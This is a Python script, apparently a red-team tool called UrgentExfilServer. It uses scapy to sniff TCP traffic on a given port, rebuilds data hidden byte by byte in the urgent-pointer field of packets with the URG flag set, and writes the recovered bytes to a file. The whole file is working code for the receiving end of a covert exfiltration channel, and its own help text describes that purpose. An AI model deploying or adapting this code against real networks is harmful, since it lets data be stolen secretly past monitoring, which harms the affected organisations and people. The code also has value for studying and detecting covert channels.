import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sniff, IP


class UrgentExfilServer:
    def version():
        return '0.0.1'

    def __init__(self, opts):
        filemode = 'ab' if opts.append else 'wb'
        self.outfile = open(opts.outfile, filemode, 0)
        self.port = opts.port
        self.verbose = opts.verbose

    def __exit__(self, exc_type, exc_value, traceback):
        self.outfile.close()

    def process(self, packet):
        data = self.bytes_for(packet.urgptr)
        if self.verbose:
            print("From " + packet[IP].src + ": " +
                  repr(data.decode('us-ascii')))
        self.outfile.write(data)

    def listen(self):
        fil = ("tcp port " + str(self.port) +
               ' and (tcp[tcpflags] & tcp-urg) != 0')
        sniff(filter=fil, prn=self.process)

    def bytes_for(self, integer):
        length = 1 if integer < 2**8 else 2
        return integer.to_bytes(length, 'big')


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
               description="Exfiltrate data using TCP urg pointer",
               add_help=True
             )
    parser.add_argument('-p', '--port', required=True, action='store',
                        help='Port to watch for URG messages', type=int)
    parser.add_argument('-f', '--outfile', action='store',
                        help='Location to save received data',
                        required=True)
    parser.add_argument('-v', '--verbose', action='store_true',
                        dest='verbose', help='Enable verbose output')
    parser.add_argument('--truncate', action='store_false', dest='append',
                        help='Truncate outfile', default=True)
    parser.add_argument('--version', action='version',
                        version=('%(prog)s ' + UrgentExfilServer.version()),
                        help="Show version information")
    opts = parser.parse_args()
    exfil = UrgentExfilServer(opts)
    exfil.listen()
